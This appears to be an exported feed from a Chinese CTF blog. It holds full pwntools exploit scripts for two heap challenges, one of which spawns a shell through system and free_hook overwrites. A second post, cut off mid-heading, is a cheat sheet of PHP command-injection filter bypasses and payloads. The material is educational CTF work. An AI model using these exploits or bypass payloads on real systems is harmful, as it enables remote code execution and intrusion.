class="hljs-params">index</span>):<br>choice(<span class="hljs-number">2</span>)<br>sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,index)<br><br><span class="hljs-comment"># io=process(&quot;./hacknote&quot;)</span><br>io=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26410</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23-32.so&#x27;</span>)<br><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>,p32(<span class="hljs-number">0x804862b</span>)+p32(<span class="hljs-number">0x804a018</span>)) <span class="hljs-comment">#2 func_puts + free_got</span><br>show(<span class="hljs-number">1</span>)<br>free_addr=u32(io.recv(<span class="hljs-number">4</span>))<br><br>libc_base=free_addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;free_got===&gt;%s\nsystem===&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(free_addr),<span class="hljs-built_in">hex</span>(system))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">libc = LibcSearcher(&quot;free&quot;, free_addr)</span><br><span class="hljs-string">libc_base=free_addr-libc.dump(&quot;free&quot;)</span><br><span class="hljs-string">system = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">offset=libc.sym[&#x27;system&#x27;]-libc.sym[&#x27;free&#x27;] # got offset</span><br><span class="hljs-string">system=free_addr+offset</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x8</span>,p32(system)+<span class="hljs-string">b&quot;;sh&quot;</span>)<br><span class="hljs-comment"># gdb.attach(io,&quot;b *&#123;&#125;&quot;.format(hex(system)))</span><br><span class="hljs-comment"># p()</span><br>show(<span class="hljs-number">1</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926225030991.png" class="" title="image-20220926225030991"><p>注：我在本地调试是打不通的，因为我的ubuntu是64位而程序是32位，所以地址差异的原因打不通。</p><h3 id="baigei"><a href="#baigei" class="headerlink" title="baigei"></a>baigei</h3><p><strong>libc-2.27</strong></p><p>程序逻辑漏洞，可二次修改堆块大小。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20221001100742793.png" class="" title="image-20221001100742793"><p>puts(“error”)之前就已经给size赋值，且没有重复分配的检查，因此我们可以add(1,0x20),’aaaa’)，然后再add(1,0x1000)，把size改大，构造overlap泄露地址，最后就是简单的tcahebin-attack打free_hook。</p><blockquote><p>至于为什么不打malloc_hook，因为libc-2.27的tcache机制实际上使堆的利用更加简单的，fastbin大小的堆块free之后会先进入tcache bin，只有当tcache bin满了(最多容纳7个)才会计入fastbin。</p><p>tcache不会检查堆头，而free_hook附近全是空字节(fastbin attack需要0x7f)，因此直接拿tcache打很方便</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io = process(<span class="hljs-string">&#x27;./main&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./main&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br>libc = elf.libc<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>gdb.attach(io)<br>raw_input()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">c</span>):<br>io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>choice(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>choice(<span class="hljs-number">3</span>)<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>choice(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>choice(<span class="hljs-number">2</span>)<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_add</span>(<span class="hljs-params">idx,size</span>):<br>choice(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>fake_add(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;1111111111&#x27;</span>)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x621</span>))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>show(<span class="hljs-number">3</span>)<br>leak = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>malloc_hook = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>fh = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>success(<span class="hljs-built_in">hex</span>(libc_base))<br>success(<span class="hljs-built_in">hex</span>(fh))<br><span class="hljs-comment">#leak</span><br><br><br>fake_add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;1111111&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>)+p64(fh))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(system))<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,p64(system))<br>p()<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">9</span>)<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctf-RCEbypass简单总结</title>
    <link href="/2022/09/12/ctf-RCEbypass%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"/>
    <url>/2022/09/12/ctf-RCEbypass%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">pcntl_exec</span><span class="hljs-params">()</span></span><br>反引号`` 同<span class="hljs-built_in">shell_exec</span>() <br></code></pre></td></tr></table></figure><h3 id="管道符与元字符"><a href="#管道符与元字符" class="headerlink" title="管道符与元字符"></a>管道符与元字符</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">CR</span>：回车键&lt;ennter&gt;<br>=：设定变量<br><span class="hljs-variable">$：</span>作变量或运算替换<br>&gt;：重定向标准输入<br>&lt;：重定向标准输出<br>[<span class="hljs-symbol">:alnum</span><span class="hljs-symbol">:</span>]任意数字或者字母<br>[<span class="hljs-symbol">:alpha</span><span class="hljs-symbol">:</span>]任意字母<br>[<span class="hljs-symbol">:space</span><span class="hljs-symbol">:</span>]空格<br>[<span class="hljs-symbol">:lower</span><span class="hljs-symbol">:</span>]小写字母<br>[<span class="hljs-symbol">:digit</span><span class="hljs-symbol">:</span>]任意数字<br>[<span class="hljs-symbol">:upper</span><span class="hljs-symbol">:</span>]任意大写字母<br>[<span class="hljs-symbol">:cntrl</span><span class="hljs-symbol">:</span>]控制符<br>[<span class="hljs-symbol">:graph</span><span class="hljs-symbol">:</span>]图形<br>[<span class="hljs-symbol">:print</span><span class="hljs-symbol">:</span>]可打印字符<br>[<span class="hljs-symbol">:punct</span><span class="hljs-symbol">:</span>]标点符号<br>[<span class="hljs-symbol">:xdigit</span><span class="hljs-symbol">:</span>]十六进制数<br>[<span class="hljs-symbol">:blank</span><span class="hljs-symbol">:</span>]空白字符<br><br>&#124;：命令管道<br>&amp;：重导向文件描述符，或将命令静默执行  <span class="hljs-comment">#例如 java -jar test.jar&amp;代表后台运行</span><br>&#124;&#124;：前面的命令执行错误就执行后面的语句，否则只执行前面的语句<br>&amp;&amp;：前面的命令执行正确就执行后面的语句，否则只执行前面的语句<br>;：忽略前一个命令的返回值，继续执行下一条指令<br></code></pre></td></tr></table></figure><h3 id="空格的替换"><a href="#空格的替换" class="headerlink" title="空格的替换"></a>空格的替换</h3><h4 id="常规替换"><a href="#常规替换" class="headerlink" title="常规替换"></a>常规替换</h4><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;<br>&lt;&gt;<br>$IFS<br>$&#123;IFS&#125;<br>$IFS$(<span class="hljs-number">1</span><span class="hljs-number">-9</span>)  #从<span class="hljs-number">1</span>到<span class="hljs-number">9</span>，可以进行fuzz<br>&#123;cat,flag.txt&#125; <span class="hljs-comment">//花括号连接执行</span><br>%09<br>%20<br></code></pre></td></tr></table></figure><h4 id="u的妙用"><a href="#u的妙用" class="headerlink" title="$u的妙用"></a>$u的妙用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-variable">$u</span>在Linux中代表的是空字符串(未初始化变量)，并不是代表是空格，我们可以将其随意插入到命令中，比如<br>c<span class="hljs-variable">$&#123;u&#125;</span>at index<span class="hljs-variable">$u</span>.php<span class="hljs-variable">$u</span><br>c`<span class="hljs-variable">$u</span>`at index<span class="hljs-variable">$u</span>.php<span class="hljs-variable">$u</span><br></code></pre></td></tr></table></figure><h4 id="命令提示符-绕过"><a href="#命令提示符-绕过" class="headerlink" title="命令提示符$绕过"></a>命令提示符$绕过</h4> <figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$*</span>、<span class="hljs-variable">$@</span>、<span class="hljs-variable">$x</span>（x=<span class="hljs-number">1</span>~<span class="hljs-number">9</span>）、<span class="hljs-variable">$&#123;</span>x&#125;（x&gt;<span class="hljs-number">9</span>)<br>在没有传参时，这些值都为空（<span class="hljs-variable">$0</span>表示shell本身的文件名，不可用）<br>例如：<br>ca<span class="hljs-variable">$*</span>t flag<br>ca<span class="hljs-variable">$@</span>t flag<br>ca<span class="hljs-variable">$7t</span> flag<br>ca<span class="hljs-variable">$&#123;</span><span class="hljs-number">18</span>&#125;t flag <br></code></pre></td></tr></table></figure><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stata">?：匹配一个字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>??<br><br><span class="hljs-comment">*：匹配一个或多个任意字符#cat fl*</span><br><br>[<span class="hljs-keyword">list</span>]：匹配<span class="hljs-keyword">list</span>内的任意单个字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>[a]<span class="hljs-keyword">g</span>   例如[@-[]可以表示大写字母<br><br>[!<span class="hljs-keyword">list</span>] or [ ^<span class="hljs-keyword">list</span>]：匹配<span class="hljs-keyword">list</span>外的任意单个字符#<span class="hljs-keyword">cat</span> fla[s]<br><br>&#123;s1,s2,s3,...&#125;：匹配s1，s2，s3或者其它更多字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>&#123;a,b&#125;<span class="hljs-keyword">g</span><br><br><br><span class="hljs-comment">//用通配符匹配tmp目录下的临时session文件</span><br><span class="hljs-keyword">file</span>=/???/????????[@-[]<br></code></pre></td></tr></table></figure><h3 id="可插入字符"><a href="#可插入字符" class="headerlink" title="可插入字符"></a>可插入字符</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel">l&lt;s<br>l&lt;&gt;s<br>ca<span class="hljs-string">&quot;&quot;</span>t<br>ca<span class="hljs-string">&#x27;&#x27;</span>t<br>ca<span class="hljs-string">``</span>t<br>ca\t<br>a=c;b=at;$a$b xxx.php    # 变量拼接<br>c$&#123;u&#125;at                  # 因为c$uat 系统不知道你要执行的是$u还是$uat，因此加上界定符，命令成功运行<br>l<span class="hljs-string">`$u`</span>s<br>wh$1oami<br>who$@ami<br>whoa$*mi<br></code></pre></td></tr></table></figure><h3 id="bash读取文件命令"><a href="#bash读取文件命令" class="headerlink" title="bash读取文件命令"></a>bash读取文件命令</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sqf">cat <span class="hljs-built_in">flag</span><span class="hljs-comment">// 正序输出所有内容</span><br>tac <span class="hljs-built_in">flag</span><span class="hljs-comment">// 从最后一行开始倒序输出所有内容</span><br>php <span class="hljs-built_in">flag</span><span class="hljs-comment">// php读取</span><br>head <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件前若干行（需要加参数 -n）</span><br>tail <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件后若干行（需要加参数 -n）</span><br>more <span class="hljs-built_in">flag</span><span class="hljs-comment">// 按页读文件</span><br>less <span class="hljs-built_in">flag</span><span class="hljs-comment">// 好像和more差不多</span><br>nl <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件顺便显示行号</span><br>od <span class="hljs-built_in">flag</span><span class="hljs-comment">// 一般用od -c flag</span><br>file -f <span class="hljs-built_in">flag</span><span class="hljs-comment">// 利用file报错出flag</span><br><span class="hljs-built_in">sort</span> <span class="hljs-built_in">flag</span><span class="hljs-comment">// 按首列ascii排序后输出</span><br>uniq <span class="hljs-built_in">flag</span><span class="hljs-comment">// 删除重复出现的行列</span><br>paste <span class="hljs-built_in">flag</span><span class="hljs-comment">// 合并文件的行列并输出</span><br>diff <span class="hljs-built_in">flag</span> file<span class="hljs-comment">// 对比flag和file的不同</span><br>bzmore <span class="hljs-built_in">flag</span><span class="hljs-comment">// 将bzip压缩过的文件解压后输出</span><br>bzless <span class="hljs-built_in">flag</span><span class="hljs-comment">// bzmore增强版</span><br>curl file:<span class="hljs-comment">///flag// file协议读</span><br>sed -n <span class="hljs-string">&#x27;1,2p&#x27;</span> <span class="hljs-built_in">flag</span><span class="hljs-comment">// 1，2表示显示1~2行，可以不要</span><br>strings <span class="hljs-comment">//字符串形式查看文件</span><br>grep  <span class="hljs-comment">//例如 grep test *php strings 表示查找并打印出以php为后缀的文件中包含字符串test的行</span><br></code></pre></td></tr></table></figure><h3 id="php文件读取函数"><a href="#php文件读取函数" class="headerlink" title="php文件读取函数"></a>php文件读取函数</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mel">#通过单一函数读取文件<br>c=echo file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=readfile(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=var_dump(<span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>c=print_r(<span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>#这里做一个解释<span class="hljs-string">`file — 把整个文件读入一个数组中`</span><br>#通过<span class="hljs-keyword">fopen</span>去读取文件内容，这里介绍下函数<br><span class="hljs-keyword">fread</span>()<br>fgets()<br>fgetc()<br>fgetss()<br>fgetcsv()<br>gpassthru()<br><br>一些payload:<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgets($a);echo $line;&#125;#一行一行读取<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgetc($a);echo $line;&#125;#一个一个字符读取<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload1:c=system(<span class="hljs-string">&quot;nl fla?????&quot;</span>);<br>payload2:c=system(<span class="hljs-string">&quot;nl fla*&quot;</span>);<br>payload3:c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl<span class="hljs-string">&#x27;&#x27;</span>ag.php`;    或者c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl“”ag.php`;<br>payload4:c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl\ag.php`;    <span class="hljs-comment">#转义字符绕过</span><br>payload5:c=include(<span class="hljs-variable">$_GET</span>[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>payload6:c=<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_GET</span>[1]);&amp;1=system(<span class="hljs-string">&#x27;nl flag.php&#x27;</span>);<br>payload7:c=awk <span class="hljs-string">&#x27;&#123;printf $0&#125;&#x27;</span> flag.php&#124;&#124;<br></code></pre></td></tr></table></figure><h2 id="Bypass技巧"><a href="#Bypass技巧" class="headerlink" title="Bypass技巧"></a>Bypass技巧</h2><h3 id="1-bash进制转换、编码"><a href="#1-bash进制转换、编码" class="headerlink" title="1.bash进制转换、编码"></a>1.bash进制转换、编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">//16进制编码、解码<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cat flag&quot;</span>&#124;xxd -p   <span class="hljs-comment"># encode</span><br>63617420666c61670a<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61670a&quot;</span>&#124;xxd -r -p   <span class="hljs-comment"># decode</span><br><span class="hljs-built_in">cat</span> flag<br><br>//8进制执行<br>$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\154\163&quot;</span>)  <span class="hljs-comment">#ls</span><br><br>//base64编码、解码<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cat flag&quot;</span> &#124; <span class="hljs-built_in">base64</span>  <span class="hljs-comment"># encode</span><br>Y2F0IGZsYWcK<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWcK&quot;</span> &#124; <span class="hljs-built_in">base64</span> -d  <span class="hljs-comment"># decode</span><br><span class="hljs-built_in">cat</span> flag<br><br>`<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Y2F0Cg==&#x27;</span> &#124; <span class="hljs-built_in">base64</span> -d` flag.txt     <span class="hljs-comment"># &quot;Y2F0Cg==&quot; 解码后是cat</span><br><br></code></pre></td></tr></table></figure><p>如果加上直接执行的话就是</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">16进制：echo <span class="hljs-variable">&lt;hexString&gt;</span>&#124;<span class="hljs-string">xxd -r -p</span>&#124;bash<br>base64：echo <span class="hljs-variable">&lt;base64String&gt;</span>&#124;<span class="hljs-string">base64 -d</span>&#124;bash<br></code></pre></td></tr></table></figure><h3 id="2-bash内联执行"><a href="#2-bash内联执行" class="headerlink" title="2.bash内联执行"></a>2.bash内联执行</h3><p>将输出作为输入执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$() 代表执行括号中语句的执行结果，反引号类似。</span><br><br>$(<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cat flag&#x27;</span>)<br><br>`<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cat flag&#x27;</span>`<br></code></pre></td></tr></table></figure><h3 id="3-bin目录"><a href="#3-bin目录" class="headerlink" title="3.bin目录"></a>3.bin目录</h3><p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>?at<span class="hljs-variable">$&#123;IFS&#125;</span>f???????  <span class="hljs-comment">#cat flag.php</span><br><span class="hljs-regexp">/bin/</span>base64<br></code></pre></td></tr></table></figure><h3 id="3-cp-mv-改文件名"><a href="#3-cp-mv-改文件名" class="headerlink" title="3.cp mv 改文件名"></a>3.cp mv 